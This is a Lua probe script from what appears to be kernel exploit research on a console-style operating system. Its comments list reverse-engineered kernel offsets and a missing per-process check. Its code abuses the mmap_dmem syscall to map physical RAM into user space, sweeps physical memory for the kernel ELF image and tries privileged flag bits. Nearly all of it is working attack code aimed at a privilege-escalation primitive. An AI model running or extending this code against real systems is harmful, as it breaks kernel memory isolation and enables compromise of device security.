-- CRASH_CLASS: LOW-MEDIUM (only in-range container indices; idx=0xffffffff is never
-- passed because it indexes 0x138 bytes BEFORE the container table = kernel OOB write)
-- PROBE 1247b: mmap_dmem (628) container reachability, then a physical sweep of the
-- first container that resolves.  Goal: install a USER mapping of physical RAM.
--
-- Decoded facts (13.60 image, body 0xabd540, worker 0x3cb450):
--   gate 0x3c33e0  = "return idx < 0x15"  (no per-process test)
--   worker window  = pa < 0x5000000000 and pa+len <= 0x5000000000
--   worker needs   = a range descriptor of the chosen container with
--                    byte [desc+0x69] == 0xfe, desc+0x48 <= pa < desc+0x50,
--                    desc.hi >= pa+len
--   capability     = 0x609560, 0x6095a0, 0x6092d0 on cred = [proc+0x140]
--                    (all three PASS for a level-2 user: earlier runs got 16/22, not 1)
--   arg map        = (pa, len, idx, prot, extra_bits, extra_pa)
print("=== PROBE 1247b: mmap_dmem container hunt + physical sweep ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function peek(addr, n)
  local s = ""
  for i=0,n-1 do
    local ok,v = pcall(function() return N(memory.read_byte(addr+i)) end)
    if ok then s = s .. string.format("%02X", v) else s = s .. "??" end
  end
  return s
end
local function mmap(addr,len,prot,flags,fd,off) return N(mk(477)(addr,len,prot,flags,fd,off)) end

local dmem = mk(628)
local SZ   = 0x4000
print(string.format("[0] pid=%d", N(mk(20)())))

-- ------------------------------------------------------------------ A: which idx resolves at all
print("[A] 628(pa=0, len=0x4000, idx=0..0x14, prot=3, extra=0, extra_pa=0)")
local good = {}
for idx = 0, 0x14 do
  local rv = N(dmem(0, SZ, idx, 3, 0, 0))
  local e  = ES()
  local line = string.format("  idx=%-3d -> rv=%-12d errno=\"%s\"", idx, rv, e)
  if rv > 0 and rv < 0x800000000000 then
    good[#good+1] = idx
    line = line .. "  head=" .. peek(rv, 32)
  end
  print(line)
end
print(string.format("[A] resolving indices: %d", #good))

-- ------------------------------------------------------------------ B: physical sweep
-- If any container exposes low physical memory, map 4 KiB at a time and look for
-- the kernel image.  Everything here is read-only from the caller's side.
local SCAN_LEN = 64 * 1024 * 1024      -- 64 MiB window
local STEP     = 0x400000              -- 4 MiB steps
for _, idx in ipairs(good) do
  print(string.format("[B] idx=%d physical sweep over [0, %X) step %X", idx, SCAN_LEN, STEP))
  local hits = 0
  local pa = 0
  while pa < SCAN_LEN do
    local rv = N(dmem(pa, SZ, idx, 3, 0, 0))
    if rv > 0 and rv < 0x800000000000 then
      local h = peek(rv, 16)
      hits = hits + 1
      local tag2 = ""
      if string.sub(h,1,8) == "7F454C46" then tag2 = " *** ELF ***" end
      if hits <= 24 then
        print(string.format("    pa=%08X -> va=%012X %s%s", pa, rv, h, tag2))
      end
    end
    pa = pa + STEP
  end
  print(string.format("[B] idx=%d mapped %d of %d steps", idx, hits, math.floor(SCAN_LEN / STEP)))
end

-- ------------------------------------------------------------------ C: flag coverage at the first good idx
if good[1] then
  print("[C] prot/extra-bit coverage at idx=" .. good[1])
  local rows = {
    {0, SZ, 3,        0},
    {0, SZ, 0x33,     0},
    {0, SZ, 0x3f3,    0},
    {0, SZ, 2,        0},
    {0, SZ, 1,        0},
    {0, SZ, 3,        0x20d0},
    {0, SZ, 3,        0x1000000},   -- devkit-only bit, gated by proc+0xc81
    {0, 0x100000, 3,  0},          -- 1 MiB length
    {0, 0x400000, 3,  0},          -- 4 MiB length
  }
  for _,r in ipairs(rows) do
    local rv = N(dmem(r[1], r[2], good[1], r[3], r[4], 0))
    print(string.format("    pa=%X len=%X prot=%X extra=%X -> rv=%d errno=\"%s\"",
      r[1], r[2], r[3], r[4], rv, ES()))
  end
end

-- ------------------------------------------------------------------ D: settle / free
if good[1] then
  print("[D] munmap controls")
  print(string.format("    munmap(0,0x4000)=%d errno=\"%s\"", N(mk(73)(0,0x4000)), ES()))
end
print("=== DONE 1247b ===")
